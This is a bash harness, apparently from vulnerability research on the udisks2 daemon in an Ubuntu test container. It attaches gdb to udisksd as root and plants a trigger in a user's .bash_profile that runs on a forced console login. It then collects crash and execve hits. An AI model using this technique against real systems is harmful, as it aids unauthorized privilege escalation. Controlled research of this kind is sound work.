#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
method="${2:-Check}"
fstype="${3:-ext4}"
probe_dir="/tmp/udisks-missing-goto-gdb"

docker cp tools/udisks-gdb-breaks.gdb "$container:$probe_dir.gdb"
docker cp tools/udisks-active-trigger.sh "$container:$probe_dir-trigger.sh"
docker cp tools/udisks-persistent-call.py "$container:$probe_dir-persistent-call.py"

docker exec "$container" bash -lc "
set -euo pipefail
mkdir -p '$probe_dir'
chmod 0777 '$probe_dir'
chmod 0755 '$probe_dir-trigger.sh'
chmod 0755 '$probe_dir-persistent-call.py'
chown selfauth:selfauth '$probe_dir-trigger.sh' '$probe_dir-persistent-call.py'

loginctl terminate-user selfauth >/dev/null 2>&1 || true
systemctl restart udisks2.service
sleep 2
pid=\$(pidof udisksd)
echo \"udisksd_pid=\$pid\" | tee '$probe_dir/root.log'

gdb -q -nx -batch -p \"\$pid\" -x '$probe_dir.gdb' >'$probe_dir/gdb.log' 2>&1 &
gdbpid=\$!
sleep 2

old_profile_state=absent
if [ -e /home/selfauth/.bash_profile ]; then
  old_profile_state=present
  cp -a /home/selfauth/.bash_profile '$probe_dir/bash_profile.bak'
fi

cat >/home/selfauth/.bash_profile <<'PROFILE'
#!/usr/bin/env bash
set +e
/tmp/udisks-missing-goto-gdb-trigger.sh METHOD_PLACEHOLDER FSTYPE_PLACEHOLDER >/tmp/udisks-missing-goto-gdb/user.log 2>&1
echo \$? >/tmp/udisks-missing-goto-gdb/user.rc
exit
PROFILE
sed -i 's/METHOD_PLACEHOLDER/'\"$method\"'/; s/FSTYPE_PLACEHOLDER/'\"$fstype\"'/' /home/selfauth/.bash_profile
chown selfauth:selfauth /home/selfauth/.bash_profile
chmod 0644 /home/selfauth/.bash_profile

set +e
timeout 45 openvt -c 2 -s -f -w -- /bin/login -f selfauth >'$probe_dir/openvt.log' 2>&1
openvt_rc=\$?
echo \"openvt_rc=\$openvt_rc\" >>'$probe_dir/root.log'

sleep 3
if kill -0 \"\$gdbpid\" >/dev/null 2>&1; then
  kill \"\$gdbpid\" >/dev/null 2>&1 || true
  sleep 1
fi
wait \"\$gdbpid\" >/dev/null 2>&1
gdb_rc=\$?
echo \"gdb_rc=\$gdb_rc\" >>'$probe_dir/root.log'

if [ \"\$old_profile_state\" = present ]; then
  mv '$probe_dir/bash_profile.bak' /home/selfauth/.bash_profile
  chown selfauth:selfauth /home/selfauth/.bash_profile
else
  rm -f /home/selfauth/.bash_profile
fi
loginctl terminate-user selfauth >/dev/null 2>&1 || true

echo '=== root.log ==='
cat '$probe_dir/root.log' || true
echo '=== user.log ==='
sed -n '1,220p' '$probe_dir/user.log' || true
echo '=== gdb hits ==='
grep -nE 'HIT |SIGSEGV|Program received|Thread .*received|#0|#1|#2|#3|#4|#5|execve|Cannot access memory|Inferior' '$probe_dir/gdb.log' | sed -n '1,260p' || true
"
